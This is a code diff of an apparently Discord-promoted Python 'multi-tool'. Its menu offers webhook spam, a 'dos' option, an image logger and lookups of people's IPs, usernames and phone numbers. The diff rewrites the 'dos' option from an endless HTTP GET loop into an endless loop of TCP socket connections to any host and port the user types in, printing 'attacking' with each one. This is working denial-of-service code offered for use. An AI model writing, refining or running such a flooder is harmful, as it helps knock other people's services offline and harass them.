@@ -1,10 +1,10 @@
 import base64
 import datetime
-import ipaddress
 import os
-import random
+import socket
 import subprocess
 import time
+import urllib.parse
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
 from urllib import parse
@@ -52,7 +52,7 @@ def start():
     console.print(f"ip: {cleanip}", style="cyan")
     console.print(f"time: {now_full}", style="cyan")
     console.print(
-        f"1 - webhook spam{spacer}11 - discord image logger (in dev)\n2 - dos{spacer}         12 - temp email\n3 - ip lookup{spacer}   13 - metadata tools\n4 - dns lookup\n5 - whois\n6 - ip -> hostname\n7 - email records\n8 - ssl certs\n9 - username lookup\n10 - number lookup\nq - exit              https://discord.gg/A8mZqht9Fj",
+        f"1 - webhook spam{spacer}11 - discord image logger (in dev)\n2 - dos{spacer}         12 - temp email\n3 - ip lookup{spacer}   13 - metadata tools\n4 - dns lookup\n5 - whois\n6 - ip -> hostname\n7 - email records\n8 - ssl certs\n9 - username lookup\n10 - number lookup\nq - exit              https://discord.gg/j5MKxynwbV",
         style="cyan",
     )
     choice = console.input("[cyan]| [/cyan]").strip()
@@ -72,52 +72,60 @@ def start():
         webhookspam()
 
     elif choice == "2":
-        dos_url = console.input("[cyan]ip / url: [/cyan]").strip()
+        
+        user_input = console.input("[cyan]ip/url:  [/cyan]").strip()
+        
+        parse_target = user_input
+        if not parse_target.startswith(("http://", "https://")):
+            parse_target = "http://" + parse_target
+            
+        try:
+            parsed = urllib.parse.urlparse(parse_target)
+            host = parsed.hostname
+            port = parsed.port
+            scheme = urllib.parse.urlparse(user_input).scheme if user_input.startswith(("http://", "https://")) else "http"
+            
+            if port is None:
+                if scheme == "https":
+                    port = 443
+                else:
+                    port = 80
+                    
+            if not host:
+                raise ValueError("could not parse a valid hostname or ip address.")
+                
+        except Exception as e:  # noqa: BLE001
+            console.print(f"[red]invalid input format: {e}[/red]")
+            port = None
 
-        if not dos_url.startswith(("http://", "https://")):
-            try:
-                ipaddress.ip_address(dos_url)
-                dos_url = "http://" + dos_url
-            except ValueError:
-                dos_url = "https://" + dos_url
-
-        ua = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        ]
-
-        def get_random_headers():
-            return {
-                "User-Agent": random.choice(ua),
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-                "Accept-Language": "en-US,en;q=0.5",
-                "Accept-Encoding": "gzip, deflate, br",
-                "Connection": "keep-alive",
-                "Upgrade-Insecure-Requests": "1",
-                "Content-Type": "application/octet-stream",
-            }
-
-        def dos():
+        if port is not None:
+            console.print(f"[yellow]testing connection to {host} on port {port}...[/yellow]")
             num = 1
-            try:
-                while True:
-                    try:
-                        with requests.get(
-                            dos_url,
-                            # headers=get_random_headers(),
-                            timeout=5,
-                        ) as resp:
-                            console.print(f"{num}. GET {resp.status_code}", style="cyan")
-                            num += 1
-                    except requests.exceptions.ConnectTimeout:
-                        continue
-            except requests.exceptions.RequestException as e:
-                console.print("request failed:", e, style="cyan")
+            
+            while True:
+                try:
+                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                        sock.settimeout(2.0) 
+                        
+                        sock.connect((host, port))
+                        
+                        console.print(f"{num}.  attacking {host}:{port}", style="cyan")
+                        num += 1
+                        
+                except TimeoutError:
+                    console.print("[red]connection timeout[/red]")
+                    continue
+                except ConnectionRefusedError:
+                    console.print(f"[red]connection refused on port {port}.[/red]")
+                    break
+                except Exception as e:  # noqa: BLE001
+                    console.print(f"network error: {e}", style="cyan")
+                    continue
 
-        dos()
+
+
+
+
 
 
     elif choice == "3":
